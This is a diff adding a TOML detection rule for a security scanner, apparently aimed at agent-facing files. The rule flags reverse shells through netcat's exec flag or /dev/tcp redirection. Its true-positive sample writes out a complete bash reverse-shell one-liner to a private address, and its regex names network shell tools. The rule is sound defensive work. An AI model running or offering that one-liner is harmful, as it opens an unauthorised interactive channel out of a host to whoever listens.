@@ -1,0 +1,31 @@
+# SPDX-FileCopyrightText: 2026 Sebastien Rousseau
+# SPDX-License-Identifier: Apache-2.0 OR MIT
+#
+# Rules are data, not code: every implementation loads this same file, so
+# adding a rule never means writing the same pattern twice in two languages.
+
+id = "AGT-EXEC-004"
+category = "unsafe_execution"
+severity = "high"
+title = "Reverse shell"
+scope = "normalised"
+applies_to = ["*.md", "*.sh", "*.bash", "*.py", "*.js", "executable"]
+
+description = '''Reverse shell or raw network socket manipulation'''
+rationale = '''Raw socket redirection or netcat exec: an interactive channel out of the host.'''
+
+# (?i) is inline, not a host-language compile flag: the flag would not
+# survive export and the two implementations would disagree on case.
+# scope = "normalised": Matched against the whitespace-normalised document so a payload split across a newline cannot evade it.
+pattern = '''(?i)(?:nc\s+-[a-z]*e\b|/dev/tcp/\d|/dev/udp/\d)'''
+
+[[true_positive]]
+text = '''bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'''
+
+[[false_positive]]
+text = '''Open a listener with `nc -l 4444`; never use the -e flag.'''
+note = "A listener without -e is ordinary. The rule requires the exec flag specifically."
+
+[[false_positive]]
+text = '''Redirect to /dev/tcp is blocked by our egress policy.'''
+note = "The rule requires a numeric host after /dev/tcp/, so prose about the mechanism does not match."
